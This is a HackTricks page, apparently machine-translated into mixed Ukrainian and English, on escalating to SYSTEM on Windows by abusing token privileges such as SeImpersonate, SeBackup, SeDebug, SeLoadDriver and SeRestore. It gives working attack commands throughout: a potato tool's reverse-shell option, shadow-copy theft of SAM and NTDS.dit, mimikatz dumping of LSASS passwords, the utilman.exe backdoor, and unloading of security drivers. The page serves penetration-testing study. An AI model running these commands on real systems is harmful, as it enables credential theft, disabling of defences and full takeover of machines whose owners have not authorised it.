# Abuse Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

If you **don't know what are Windows Access Tokens** read this page before continuing:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи токенами, які вже маєте**

### SeImpersonatePrivilege

This is privilege that is held by any process allows the impersonation (but not creation) of any token, given that a handle to it can be obtained. A privileged token can be acquired from a Windows service (DCOM) by inducing it to perform NTLM authentication against an exploit, subsequently enabling the execution of a process with SYSTEM privileges. This vulnerability can be exploited using various tools, such as [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (which requires winrm to be disabled), [SweetPotato](https://github.com/CCob/SweetPotato), and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: on Windows 10 1809+/Server 2019+, prefer **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, or **PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or **`NETWORK SERVICE`** and `whoami /priv` shows a **filtered token** without `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recover the account's **default privilege set** first (for example with **FullPowers**) and retry the potato family afterwards.
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while **PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**, воно використовуватиме **той самий метод** для отримання привілейованого token.\
Потім ця привілея дозволяє **призначити primary token** новому/призупиненому процесу. Маючи привілейований impersonation token, ви можете отримати primary token (DuplicateTokenEx).\
За допомогою token ви можете створити **новий процес** через 'CreateProcessAsUser' або створити процес у призупиненому стані та **встановити token** (зазвичай ви не можете змінювати primary token уже запущеного процесу).

### SeTcbPrivilege

Якщо ця привілея увімкнена, ви можете використати **KERB_S4U_LOGON** для отримання **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну group** (admins) до token, встановити **integrity level** token у "**medium**" і призначити цей token **поточному thread** (SetThreadToken).

### SeBackupPrivilege

Ця привілея змушує систему **надавати весь доступ на читання** до будь-якого файлу (обмежено операціями читання). Вона використовується для **зчитування password hashes локальних облікових записів Administrator** із registry, після чого можна використовувати інструменти на кшталт "**psexec**" або "**wmiexec**" з hash (техніка Pass-the-Hash). Однак ця техніка не працює за двох умов: коли Local Administrator account вимкнено або коли діє policy, що забирає адміністративні права в Local Administrators під час віддаленого підключення.\
На практиці найнадійніший вбудований workflow зазвичай — це **VSS + `robocopy /b`**: створити/відкрити shadow copy, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Дозвіл на **write access** до будь-якого системного файла, незалежно від Access Control List (ACL) файлу, надається цим привілеєм. Він відкриває безліч можливостей для ескалації, включно зі здатністю **modify services**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options, серед інших технік.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач має можливість impersonate tokens, але також і за відсутності SeImpersonatePrivilege. Ця можливість залежить від здатності impersonate token, який представляє того самого користувача і рівень цілісності якого не перевищує рівень цілісності поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можна використати SeCreateTokenPrivilege для EoP, impersonating tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний impersonation вимагає, щоб цільовий token належав тому самому користувачу і мав рівень цілісності, менший або рівний рівню цілісності процесу, що намагається здійснити impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і підсилити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілей дозволяє **load and unload device drivers** шляхом створення запису в реєстрі зі специфічними значеннями для `ImagePath` і `Type`. Оскільки прямий write access до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, натомість потрібно використати `HKCU` (HKEY_CURRENT_USER). Однак, щоб зробити `HKCU` розпізнаваним ядром для налаштування driver, необхідно дотриматися певного шляху.

Сучасне offensive-використання зазвичай — це **BYOVD** (bring your own vulnerable driver): завантажити **signed but vulnerable** kernel driver, а потім використати його IOCTLs, щоб вимкнути захист або перейти до kernel code execution. Майте на увазі, що в нещодавніх збірках Windows 11/Server **Microsoft vulnerable driver blocklist** та/або **HVCI/Memory Integrity** часто ламають старі публічні ланцюжки, тож класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

This path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, where `<RID>` is the Relative Identifier of the current user. Inside `HKCU`, this entire path must be created, and two values need to be set:

- `ImagePath`, which is the path to the binary to be executed
- `Type`, with a value of `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Access `HKCU` instead of `HKLM` due to restricted write access.
2. Create the path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` within `HKCU`, where `<RID>` represents the current user's Relative Identifier.
3. Set the `ImagePath` to the binary's execution path.
4. Assign the `Type` as `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим привілеєм у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє процесу **приймати право власності на об’єкт**, обходячи вимогу явного discretionary access через надання прав доступу WRITE_OWNER. Процес полягає спочатку в отриманні права власності на потрібний ключ реєстру для запису, а потім у зміні DACL, щоб увімкнути операції запису.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ця привілея дозволяє **debug other processes**, зокрема читати й записувати в memory. Із цією привілеєю можна застосовувати різні стратегії memory injection, здатні обходити більшість antivirus та host intrusion prevention solutions.

На сучасному Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні tokens, але це **не** гарантія, що ви зможете працювати з **LSASS**. Якщо **RunAsPPL / LSA Protection** увімкнено, non-protected processes не можуть читати або inject into LSASS навіть за наявності `SeDebugPrivilege`. У такому разі вкрадіть token з іншого non-PPL SYSTEM process або поєднайте це з PPL bypass/BYOVD, замість того щоб припускати, що `procdump` спрацює. Для повного прикладу копіювання token за допомогою `SeDebugPrivilege` + `SeImpersonatePrivilege` дивіться [цю сторінку](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Ви можете використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) з [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це може застосовуватися до process **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання user credentials після того, як користувач успішно увійшов у system.

Потім ви можете завантажити цей dump у mimikatz, щоб отримати passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати shell `NT SYSTEM`, ви можете використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати сирі дескриптори volume device (наприклад, \\.\C:) для прямого disk I/O, що обходить NTFS ACLs. З його допомогою можна копіювати байти будь-якого файла на volume, читаючи базові blocks, що дає змогу виконати arbitrary file read конфіденційних даних (наприклад, machine private keys у %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS через VSS). Це особливо важливо на CA servers, де exfiltrating CA private key дає змогу forge Golden Certificate для impersonate будь-якого principal.

Див. детальні techniques і mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Токени, що відображаються як Disabled, зазвичай можна увімкнути, тож ви часто можете зловживати як _Enabled_, так і _Disabled_ привілеями.

### Увімкнути всі токени

Якщо у вас є disabled привілеї, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цьому [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повний cheatsheet з token privileges: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче наведено лише прямі способи використати privilege, щоб отримати admin session або прочитати sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Я спробую незабаром перефразувати це в більш recipe-like вигляді.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Читайте sensitive files за допомогою `robocopy /b` або спеціалізованих SeBackup-aware copy helpers.                                                                                                                                                                                                                                               | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а інколи й для `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціалізовані SeBackup cmdlets/APIs часто гнучкіші для locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Створювати arbitrary token, включно з local admin rights, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate a **non-PPL** SYSTEM token або dump memory з non-protected process.                                                                                                                                                                                                                                                                   | <p>LSASS dumping зазвичай blocked, якщо увімкнено RunAsPPL/LSA Protection.</p><p>Script можна знайти на [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Використати **Potato family** / named-pipe impersonation, щоб spawn SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Найпрактичніше з service accounts, таких як IIS APPPOOL, MSSQL, scheduled tasks, або будь-якого context, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load signed-but-vulnerable kernel driver (BYOVD)<br>2. Use the driver's IOCTLs to get kernel R/W, disable security tooling, or elevate to SYSTEM<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>fltMC</code> builtin command, i.e. <code>fltMC sysmondrv</code></p>                     | <p>Older public drivers such as <code>szkg64.sys</code> дедалі частіше blocked у modern Windows через vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустіть PowerShell/ISE, коли SeRestore privilege присутня.<br>2. Увімкніть privilege за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменуйте utilman.exe на utilman.old<br>4. Перейменуйте cmd.exe на utilman.exe<br>5. Lock the console і натисніть Win+U</p> | <p>Attack може бути detected деяким AV software.</p><p>Alternative method relies on replacing service binaries, що зберігаються в "Program Files", використовуючи ту саму privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console і натисніть Win+U</p>                                                                                                                                       | <p>Attack може бути detected деяким AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Маніпулювати tokens так, щоб local admin rights були included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Подивіться на цю table, що визначає Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Подивіться на [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) про privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
